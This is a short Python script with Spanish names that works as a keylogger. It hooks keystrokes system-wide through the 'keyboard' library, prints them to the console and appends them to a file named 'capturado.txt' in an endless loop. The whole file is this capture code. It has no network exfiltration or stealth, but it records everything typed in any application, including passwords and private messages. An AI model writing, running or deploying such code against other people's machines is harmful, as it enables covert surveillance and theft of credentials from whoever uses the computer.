import keyboard
import os

def limpiar_pantalla():
    os.system('cls')

def gestionar_fichero():
    if not os.path.exists('capturado.txt'):
        with open('capturado.txt', 'w', encoding='utf-8') as f:
            f.write("Estas son las teclas capturadas:\n")
            f.write("")

def guardar_fichero(tecla, f):
    if tecla == "space":
        tecla = " "
    elif tecla == "enter":
        tecla = "\n"
    elif len(tecla) > 2:
        tecla = f"| {tecla} |"
    f.write(tecla)
    f.flush()

def capturar_teclas():
    teclas_presionadas = []
    with open('capturado.txt', 'a', encoding='utf-8') as f:
        i = 0
        while i < 50:
            captura = keyboard.read_event()
            if captura.event_type == keyboard.KEY_DOWN:
                tecla = captura.name
                teclas_presionadas.append(tecla)
                print(''.join(teclas_presionadas))
                guardar_fichero(tecla, f)
                i += 1

def main():
    gestionar_fichero()
    while True:
        capturar_teclas()

if __name__ == '__main__':
    main()